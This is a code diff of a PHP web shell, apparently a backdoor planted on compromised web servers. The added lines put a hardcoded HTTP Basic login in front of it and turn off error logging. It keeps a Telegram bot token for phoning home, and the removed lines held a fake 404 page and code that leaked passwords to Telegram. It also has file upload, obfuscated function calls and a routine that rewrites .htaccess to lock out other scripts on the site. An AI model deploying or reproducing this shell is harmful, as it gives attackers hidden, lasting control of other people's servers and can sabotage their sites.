@@ -1,4 +1,28 @@
 <?php
+
+$user = "human";
+
+$pass = "password";
+
+ if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))
+
+ {
+
+  header("WWW-Authenticate: Basic realm=\"M.A was here\"");
+
+  header("HTTP/1.0 401 Unauthorized");
+
+  exit();
+
+ }
+session_start();
+@set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
 $bcripthash = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
 $angka = '5070938778';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
@@ -44,77 +68,6 @@ if (isset($_FILES['file']['tmp_name'])) {
         }
     }
 }
-
-// Hash password bcrypt
-$valid_password_hash = '$2y$10$5wpvvGdwSZXwO90pV5nE3eQzxPxDmDajUxO8nhHFnZ1m5HtHWwgc2'; 
-
-// Cek Password
-session_start();
-if (!isset($_SESSION['authenticated'])) {
-    if (isset($_POST['password'])) {
-        // Verifikasi password menggunakan bcrypt
-        if (password_verify($_POST['password'], $valid_password_hash)) {
-            $_SESSION['authenticated'] = true;
-
-            // Format pesan untuk dikirim ke Telegram
-            $message = "logger masuk : $url pass : {$password}";
-
-            // Kirim pesan ke Telegram
-            sendToTelegram($botToken, $chatID, $message);
-
-            // Tidak perlu menulis log ke file
-            // logTelegramMessage("$url pass : {$password}"); // Bagian ini dihapus
-        } else {
-            $error_message = "Password salah!";
-        }
-    }
-}
-
-if (!isset($_SESSION['authenticated'])) {
-    ?>
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>404 Not Found</title>
-        <style>
-      input {
-        margin: 0;
-        background-color: #fff;
-        border: 1px solid #fff;
-        text-align: center;
-    }
-        </style>
-    </head>
-    <body>
-            <h1>404 Not Found</h1>
-            <p>The requested URL was not found on this server.</p>
-            <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
-            <hr>
-            <address>Apache Server at <?= $_SERVER['SERVER_NAME']; ?> Port 80</address>
-
-            <form method="post" action="">
-                <?php if (isset($error_message)) { ?>
-                    <div class="error"><?= htmlspecialchars($error_message); ?></div>
-                <?php } ?>
-                <center><input type="password" name="password"></center>
-            </form>
-        </center>
-    </body>
-    </html>
-    <?php
-    exit;
-}
-
-// Script utama dimulai di sini
-@set_time_limit(0);
-@clearstatcache();
-@ini_set('error_log', NULL);
-@ini_set('log_errors', 0);
-@ini_set('max_execution_time', 0);
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
 
 // function WAF
 $Array = [
@@ -670,7 +623,7 @@ if ($_GET['don'] == true) {
             <li><i class="fa-solid fa-globe">DISABLED :</i>&nbsp;<?= s(); ?></li>
             <li><i class="fa-brands fa-php">PHP VERSION :</i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user">USER :</i>&nbsp;<?= $fungsi[9](); ?></li>
-            <li class="logo-gecko"><img width="400" height="400" src="https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/icon.png" align="right"></li>
+            <li class="logo-gecko"><img width="400" height="400" src="https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/gif.gif" align="right"></li>
             <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                 <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
             </form>
@@ -1296,10 +1249,10 @@ if (isset($_GET['destroy'])) {
     $CurrentFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
     if ($fungsi[4]($DOC_ROOT)) {
         $htaccess = '
-<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
+<FilesMatch "\.(php|ph*|Ph*|PH*|pH*|shtml|shtm*|ShTm*|SHTM*|sHTm*|sh*|cgi|suspected)$">
     Deny from all
 </FilesMatch>
-<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php|woocomers.php)$">
+<FilesMatch "^(' . $CurrentFile . '|index.php|dismentel.php|wp-config.php|wp-includes.php|index.shtml)$">
     Allow from all
 </FilesMatch>
 <FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
